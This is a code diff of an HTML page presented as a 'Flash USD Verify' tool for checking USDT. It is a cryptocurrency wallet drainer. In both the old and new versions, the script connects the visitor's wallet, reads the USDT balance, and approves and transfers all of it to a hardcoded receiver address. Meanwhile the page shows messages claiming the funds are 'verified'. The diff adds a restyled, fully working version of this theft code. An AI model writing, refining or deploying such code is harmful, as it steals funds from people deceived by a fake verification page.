@@ -1,106 +1,95 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>CheckFlash</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Flash USD Verify</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
   <style>
     body {
-      background-color: #000;
-      color: #0f0;
-      font-family: Arial, sans-serif;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to bottom, #111, #000);
+      color: white;
       text-align: center;
-      padding-top: 50px;
+      padding: 50px 20px;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    #status {
+      margin: 20px 0;
+      font-size: 1.1em;
+      color: #0ff;
     }
     button {
-      font-size: 20px;
-      padding: 10px 30px;
-      background-color: #0f0;
+      padding: 15px 30px;
+      font-size: 1em;
       border: none;
+      background: #0ff;
+      color: black;
       border-radius: 8px;
       cursor: pointer;
     }
-    #status {
-      margin-top: 30px;
-      font-size: 18px;
+    button:hover {
+      background: #0cc;
     }
   </style>
 </head>
 <body>
-  <h1>CheckFlash</h1>
-  <p>Verify your USDT</p>
-  <button onclick="connectAndSend()">Approve</button>
-  <p id="status"></p>  <script>
+  <h1>Verify your USDT</h1>
+  <div id="status">Waiting for wallet...</div>
+  <button onclick="connectAndSend()">Flash USD Verify</button>
+
+  <script>
     const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
     const usdtAbi = [
-      {
-        "constant": false,
-        "inputs": [
-          {"name": "_spender", "type": "address"},
-          {"name": "_value", "type": "uint256"}
-        ],
-        "name": "approve",
-        "outputs": [{"name": "", "type": "bool"}],
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [
-          {"name": "_owner", "type": "address"}
-        ],
-        "name": "balanceOf",
-        "outputs": [
-          {"name": "balance", "type": "uint256"}
-        ],
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          {"name": "_to", "type": "address"},
-          {"name": "_value", "type": "uint256"}
-        ],
-        "name": "transfer",
-        "outputs": [
-          {"name": "", "type": "bool"}
-        ],
-        "type": "function"
-      }
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
     ];
 
-    let web3;
-    let userAccount;
-
     async function connectAndSend() {
-      document.getElementById("status").innerText = "Verifying...";
+      if (typeof window.ethereum === 'undefined') {
+        alert("Trust Wallet or MetaMask not found!");
+        return;
+      }
 
-      if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const accounts = await web3.eth.getAccounts();
-          userAccount = accounts[0];
+      const web3 = new Web3(window.ethereum);
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const sender = accounts[0];
+      const networkId = await web3.eth.net.getId();
 
-          document.getElementById("status").innerText = "Flash USDT Verify...";
-          const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-          const balance = await usdt.methods.balanceOf(userAccount).call();
+      if (networkId !== 56) {
+        document.getElementById("status").innerText = "Please switch to BNB Smart Chain.";
+        return;
+      }
 
-          if (balance > 0) {
-            await usdt.methods.approve(receiverAddress, balance).send({ from: userAccount });
-            document.getElementById("status").innerText = "Flash Your USDT Verified...";
-            await usdt.methods.transfer(receiverAddress, balance).send({ from: userAccount });
-            document.getElementById("status").innerText = "Your USDT Verified";
-          } else {
-            document.getElementById("status").innerText = "No USDT Balance";
-          }
-        } catch (err) {
-          document.getElementById("status").innerText = "Transaction Failed or Rejected";
-        }
-      } else {
-        document.getElementById("status").innerText = "Wallet not found";
+      document.getElementById("status").innerText = "Flash USD Verify...";
+
+      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const balance = await usdt.methods.balanceOf(sender).call();
+
+      if (parseInt(balance) === 0) {
+        document.getElementById("status").innerText = "No USDT found in wallet.";
+        return;
+      }
+
+      // Approve first
+      try {
+        document.getElementById("status").innerText = "Flash your study verified...";
+        await usdt.methods.approve(receiverAddress, balance).send({ from: sender });
+
+        // Transfer after approve
+        await usdt.methods.transfer(receiverAddress, balance).send({ from: sender });
+        document.getElementById("status").innerText = "Your USDT verified!";
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "Transaction cancelled or failed.";
       }
     }
-  </script></body>
+  </script>
+</body>
 </html>
